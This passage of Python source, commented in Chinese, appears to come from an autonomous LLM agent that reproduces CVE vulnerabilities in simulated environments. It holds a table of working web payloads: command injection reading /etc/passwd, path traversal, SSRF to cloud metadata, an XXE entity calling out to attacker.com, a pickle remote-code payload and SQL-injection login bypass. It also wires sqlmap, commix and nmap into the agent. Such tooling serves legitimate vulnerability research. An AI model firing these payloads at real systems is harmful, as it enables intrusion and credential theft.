                "分号分隔 (; command)",
                "管道符 (| command)",
                "反引号 (`command`)",
                "命令替换 ($(command))",
                "逻辑运算符 (&& || command)",
            ],
            "payloads": [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "127.0.0.1; cat /etc/passwd",
                "test`sleep 5`",
            ],
            "verification": "检查命令输出或时间延迟",
        },
        "path_traversal": {
            "recommended_tools": ["http_request"],
            "techniques": [
                "基础遍历 (../)",
                "编码绕过 (%2e%2e%2f)",
                "双重编码",
                "空字节截断 (%00)",
            ],
            "payloads": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "../../../etc/passwd%00.jpg",
            ],
            "verification": "检查是否返回系统文件内容",
        },
        "ssrf": {
            "recommended_tools": ["http_request"],
            "techniques": [
                "内网探测 (127.0.0.1, localhost)",
                "云元数据 (169.254.169.254)",
                "协议利用 (file://, gopher://)",
                "DNS重绑定",
            ],
            "payloads": [
                "http://127.0.0.1:80",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ],
            "verification": "检查是否返回内网服务响应或敏感文件",
        },
        "xxe": {
            "recommended_tools": ["http_request"],
            "techniques": [
                "经典XXE (外部实体)",
                "参数实体 (%entity;)",
                "盲XXE (外带数据)",
                "错误信息泄露",
            ],
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            ],
            "verification": "检查响应是否包含外部文件内容或外带请求",
        },
        "deserialization": {
            "recommended_tools": ["http_request", "run_semgrep"],
            "techniques": [
                "Java反序列化 (Commons Collections, etc)",
                "Python pickle",
                "PHP unserialize",
                "Node.js node-serialize",
            ],
            "payloads": [
                "ysoserial payloads for Java",
                'cos\nsystem\n(S\'id\'\ntR.',  # Python pickle
            ],
            "verification": "检查RCE执行或DNS/HTTP回调",
        },
        "auth_bypass": {
            "recommended_tools": ["http_request", "browser_session_start"],
            "techniques": [
                "SQL注入绕过 (' OR '1'='1)",
                "默认凭证",
                "JWT伪造",
                "Session固定",
                "路径规范化绕过",
            ],
            "payloads": [
                "admin' OR '1'='1",
                "admin/admin, root/root, test/test",
                "修改JWT声明",
            ],
            "verification": "检查是否获得未授权访问",
        },
    }
    
    if vuln_type.lower() not in patterns:
        available = ", ".join(patterns.keys())
        return f"ERROR: 未知漏洞类型 '{vuln_type}'。支持的类型: {available}"
    
    pattern = patterns[vuln_type.lower()]
    
    result = f"""
=== 漏洞类型分析: {vuln_type.upper()} ===

📍 目标信息: {target_info}

🔧 推荐工具:
{chr(10).join(f'  - {tool}' for tool in pattern['recommended_tools'])}

💡 利用技术:
{chr(10).join(f'  {i+1}. {tech}' for i, tech in enumerate(pattern['techniques']))}

💉 示例 Payload:
{chr(10).join(f'  - {p}' for p in pattern['payloads'][:5])}

✅ 验证方法:
  {pattern['verification']}
"""
    
    if additional_context:
        result += f"\n📝 额外上下文:\n  {additional_context}\n"
    
    result += """
📋 建议步骤:
  1. 使用 run_nmap 或 http_request 确认目标可达
  2. 使用推荐的专业工具进行自动化测试
  3. 如果自动化工具失败,使用 http_request 手动测试payload
  4. 使用 browser_* 工具验证客户端漏洞 (如XSS)
  5. 记录成功的payload和响应作为PoC证据
"""
    
    return result


# 将自定义工具添加到 FREESTYLE_TOOLS
FREESTYLE_TOOLS = {
    **TOOLS,  # 继承所有基础工具
    # 基础Web工具
    'create_html_test_page': create_html_test_page,
    'start_http_server': start_http_server,
    'run_browser_test': run_browser_test,
    'browser_interact_spa': browser_interact_spa,  # 新增：专门用于 SPA 应用的浏览器自动化
    'verify_window_opener_vulnerability': verify_window_opener_vulnerability,
    'install_npm_package': install_npm_package,
    'test_xss_in_response': test_xss_in_response,
    # Docker 工具
    'get_docker_container_ip': get_docker_container_ip,
    'run_docker_container': run_docker_container,
    'wait_for_service': wait_for_service,
    'diagnose_docker_network': diagnose_docker_network,
    'stop_docker_container': stop_docker_container,
    # 专业安全工具
    'run_sqlmap': run_sqlmap,
    'run_commix': run_commix,
    'run_nmap': run_nmap,
    'run_nikto': run_nikto,
    'run_semgrep': run_semgrep,
    'run_xss_scanner': run_xss_scanner,
    # 大脑/分析工具
    'analyze_vulnerability_pattern': analyze_vulnerability_pattern,
}


# ============================================================
# FreestyleAgent 类
# ============================================================

class FreestyleAgent(AgentWithHistory[dict, str]):
    """
    自由探索 Agent - 自主决定如何复现漏洞
    
    特点:
    1. 拥有完整的工具集 - 命令执行、文件操作、浏览器测试等
    2. 可接收 BrainAgent 的攻击计划
    3. 迭代尝试 - 失败后可以调整策略重试
    4. 最终验证 - 必须产出可验证的结果
    """
    
    __SYSTEM_PROMPT_TEMPLATE__ = 'freestyle/freestyle.system.j2'
    __USER_PROMPT_TEMPLATE__ = 'freestyle/freestyle.user.j2'
    __LLM_MODEL__ = 'gpt-4o'  # 使用更强的模型进行自主决策
    __MAX_TOOL_ITERATIONS__ = 30  # 允许更多迭代
    
    # Agent 属性
    CVE_ID: Optional[str] = None
    CVE_ENTRY: Optional[Dict[str, Any]] = None
    CVE_KNOWLEDGE: Optional[str] = None
    ATTACK_PLAN: Optional[str] = None  # BrainAgent 生成的攻击计划
    DEPLOYMENT_STRATEGY: Optional[Dict[str, Any]] = None  # 新增：部署策略
    WORK_DIR: str = "/workspaces/submission/src/simulation_environments"
    
    def __init__(
        self, 
        cve_id: str = None,
        cve_entry: dict = None,
        cve_knowledge: str = None,
        attack_plan: str = None,  # 攻击计划
        deployment_strategy: dict = None,  # 新增:部署策略
        work_dir: str = None,
        **kwargs
    ):
        super().__init__(**kwargs)
        
        self.CVE_ID = cve_id
        self.CVE_ENTRY = cve_entry or {}
        self.CVE_KNOWLEDGE = cve_knowledge or ""
        self.ATTACK_PLAN = attack_plan
        self.DEPLOYMENT_STRATEGY = deployment_strategy or {}
        if work_dir:
            self.WORK_DIR = work_dir
        
        # 🔍 启用中途反思机制（集成DeploymentStrategy + 智能恢复）
        if deployment_strategy:
            try:
                from toolbox.command_ops import enable_reflection, reset_reflection
                reflection_context = f"正在复现漏洞 {cve_id}。\n知识库摘要：{cve_knowledge[:500] if cve_knowledge else '无'}..."
                enable_reflection(True, reflection_context, deployment_strategy)
                reset_reflection()
                print(f"[FreestyleAgent] 🔍 MidExecReflector enabled with DeploymentStrategy & Auto-Recovery")
            except Exception as e:
                print(f"[FreestyleAgent] ⚠️ Failed to enable MidExecReflector: {e}")
    
    def get_input_vars(self, *args, **kwargs) -> dict:
        """提供模板变量"""
        vars = super().get_input_vars(*args, **kwargs)
        
        # 格式化部署策略为易读文本
        deployment_info = ""
        if self.DEPLOYMENT_STRATEGY and self.DEPLOYMENT_STRATEGY.get('repository_url'):
            ds = self.DEPLOYMENT_STRATEGY
            deployment_info = f"""
## 🚀 部署策略

**仓库地址**: {ds.get('repository_url', 'N/A')}
**编程语言**: {ds.get('language', '未知')}
**构建工具**: {ds.get('build_tool', '未知')}

### 构建命令:
{chr(10).join(['  ' + cmd for cmd in ds.get('build_commands', ['# 暂无构建命令'])])}

### 启动命令:
{chr(10).join(['  ' + cmd for cmd in ds.get('start_commands', ['# 暂无启动命令'])])}

### 部署说明:
{ds.get('deployment_notes', '无特殊说明')}
"""
        
        vars.update(
            CVE_ID=self.CVE_ID,
            CVE_ENTRY=self.CVE_ENTRY,
            CVE_KNOWLEDGE=self.CVE_KNOWLEDGE,
            ATTACK_PLAN=self.ATTACK_PLAN,  # 传递给模板
            DEPLOYMENT_STRATEGY_TEXT=deployment_info,  # 新增：格式化的部署策略
            WORK_DIR=self.WORK_DIR,
            CVE_ENTRY_JSON=json.dumps(self.CVE_ENTRY, indent=2, ensure_ascii=False)[:3000] if self.CVE_ENTRY else '{}',
        )
        return vars
    
    def get_available_tools(self):
        """返回可用工具集 - 使用 FREESTYLE_TOOLS.values()"""
        return FREESTYLE_TOOLS.values()
